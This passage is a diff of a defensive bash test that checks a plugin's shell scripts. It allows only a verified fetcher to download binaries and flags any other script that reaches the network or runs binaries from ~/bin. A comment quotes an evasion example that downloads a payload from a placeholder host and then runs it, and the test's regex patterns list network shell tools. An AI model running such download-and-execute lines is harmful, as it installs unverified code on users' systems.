@@ -1,71 +1,92 @@
 #!/bin/bash
-# Asserts a property, not a file: nothing in plugin/ installs or executes a downloaded
-# binary without going through the shared verification.
+# Asserts a property, not a spelling: nothing in plugin/ may fetch from the network or
+# run a binary out of ~/bin except through the shared, verified path.
 #
-# Round 2 rated an unverified download CRITICAL. Round 3 found the fix had been applied
-# to plugin/hooks/session-start.sh and not to plugin/bin/omlx-connector-wrapper.sh —
-# same plugin, same release, other binary, still `curl -sL` into `chmod +x` into `exec`.
-# A per-file test would have been green for that, because the file it named was fixed.
+# ## Why this is an allowlist
 #
-# So this scans every shipped script. Add a third downloader that skips the verifier and
-# this goes red without anyone having to remember to add a case for it.
+# The first version enumerated what a violation looks like — grep for `curl`, grep for
+# `chmod +x`. A reviewer said that matched spellings rather than the property, and they
+# were right: this scanner reported 3 passed / 0 failed on a script that did
+#
+#     python3 -c "…urlretrieve…" https://example.com/payload "$HOME/bin/evil3"
+#     chmod 755 "$HOME/bin/evil3"
+#     "$HOME/bin/evil3" "$@"
+#
+# No `curl`, no `chmod +x`, no `exec "$BINARY"` — three clauses, all evaded, while doing
+# exactly the thing the round-2 CRITICAL was filed about. An enumeration of violations can
+# always be walked around; the set of *permitted* files cannot.
+#
+# So the rule is inverted. Exactly one file may fetch, exactly one may verify, and every
+# other script under plugin/ must be free of network access and of ~/bin execution. A new
+# script is a failure until it is either added here deliberately or written to delegate.
 set -u
 
 ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-
-# Strip comments and blank lines before scanning. These files necessarily *describe*
-# the defect they no longer have — "this used to be `curl -sL` with no --fail" — and a
-# scanner that reads prose would flag the explanation as the offence.
-code_of() { grep -vE '^\s*(#|$)' "$1"; }
 PLUGIN="$ROOT/plugin"
-VERIFIER="verify-download.sh"
 FETCHER="fetch-release-binary.sh"
+VERIFIER="verify-download.sh"
 PASS=0
 FAIL=0
 
-ok()   { echo "  ok   — $1"; PASS=$((PASS + 1)); }
-bad()  { echo "  FAIL — $1"; FAIL=$((FAIL + 1)); }
+ok()  { echo "  ok   — $1"; PASS=$((PASS + 1)); }
+bad() { echo "  FAIL — $1"; FAIL=$((FAIL + 1)); }
+
+# Comments necessarily describe the defects these files no longer have, so a scan that
+# read prose would flag the explanation as the offence — that happened once already.
+code_of() { grep -vE '^[[:space:]]*(#|$)' "$1"; }
 
 echo "no unverified downloads in plugin/"
 
-# Every script that fetches from the network must either BE the fetcher, or delegate to
-# it. Nothing may hand-roll the download.
+# Any way of reaching the network, not any particular tool. Adding a new fetch mechanism
+# to this list is the maintenance cost of the allowlist, and it is the right cost: the
+# alternative is a scanner that silently stops covering whatever gets invented next.
+NETWORK_RE='curl|wget|nscurl|urlretrieve|urlopen|requests\.|http\.client|nc |ftp |scp |URLSession|/dev/tcp'
+# Running something out of the install directory, however it is spelled.
+RUNS_INSTALLED_RE='(exec|bash|sh|source|\.)[[:space:]]+"?\$(HOME|\{HOME\})?[^"]*bin/|\$BINARY|\$INSTALL_DIR|~/bin/'
+
 while IFS= read -r script; do
     rel="${script#$ROOT/}"
     base=$(basename "$script")
-    code_of "$script" | grep -q 'curl' || continue   # not a downloader, nothing to check
+    body=$(code_of "$script")
 
-    if [ "$base" = "$FETCHER" ]; then
-        # The one place allowed to download. It must call the verifier.
-        if code_of "$script" | grep -q "$VERIFIER"; then
-            ok "$rel downloads and calls $VERIFIER"
-        else
-            bad "$rel downloads WITHOUT calling $VERIFIER"
-        fi
-        continue
-    fi
+    touches_network=false
+    runs_installed=false
+    printf '%s' "$body" | grep -qE "$NETWORK_RE" && touches_network=true
+    printf '%s' "$body" | grep -qE "$RUNS_INSTALLED_RE" && runs_installed=true
 
-    bad "$rel calls curl directly instead of delegating to $FETCHER"
-done < <(find "$PLUGIN" -type f -name '*.sh')
+    case "$base" in
+        "$FETCHER")
+            # The one permitted downloader. It must verify what it fetched.
+            if printf '%s' "$body" | grep -q "$VERIFIER"; then
+                ok "$rel is the permitted downloader and calls $VERIFIER"
+            else
+                bad "$rel downloads WITHOUT calling $VERIFIER"
+            fi
+            ;;
+        "$VERIFIER")
+            # The verifier must not fetch anything itself.
+            if $touches_network; then
+                bad "$rel is the verifier but reaches the network"
+            else
+                ok "$rel verifies without fetching"
+            fi
+            ;;
+        *)
+            if $touches_network; then
+                bad "$rel reaches the network directly — only $FETCHER may"
+            elif $runs_installed && ! printf '%s' "$body" | grep -q "$FETCHER"; then
+                bad "$rel runs a binary from the install dir without obtaining it via $FETCHER"
+            elif $runs_installed; then
+                ok "$rel obtains its binary through $FETCHER before running it"
+            else
+                ok "$rel neither fetches nor runs an installed binary"
+            fi
+            ;;
+    esac
+done < <(find "$PLUGIN" -type f -name '*.sh' | sort)
 
-# And every script that installs or execs a binary from ~/bin must have obtained it
-# through the fetcher. This is the half that C2 violated: the wrapper exec'd a binary it
-# had downloaded itself.
-while IFS= read -r script; do
-    rel="${script#$ROOT/}"
-    base=$(basename "$script")
-    [ "$base" = "$FETCHER" ] && continue
-    code_of "$script" | grep -qE 'exec "\$BINARY"|chmod \+x' || continue
-
-    if code_of "$script" | grep -q "$FETCHER"; then
-        ok "$rel obtains its binary through $FETCHER before running it"
-    else
-        bad "$rel runs or installs a binary it did not obtain through $FETCHER"
-    fi
-done < <(find "$PLUGIN" -type f -name '*.sh')
-
-# The verifier must actually be shipped. It lives under plugin/ rather than scripts/
-# precisely because scripts/ is repo-only and would not exist on a user's machine.
+# The verifier must actually ship. It lives under plugin/ rather than scripts/ precisely
+# because scripts/ is repo-only and would not exist on a user's machine.
 if [ -f "$PLUGIN/bin/$VERIFIER" ]; then
     ok "$VERIFIER ships inside the plugin"
 else
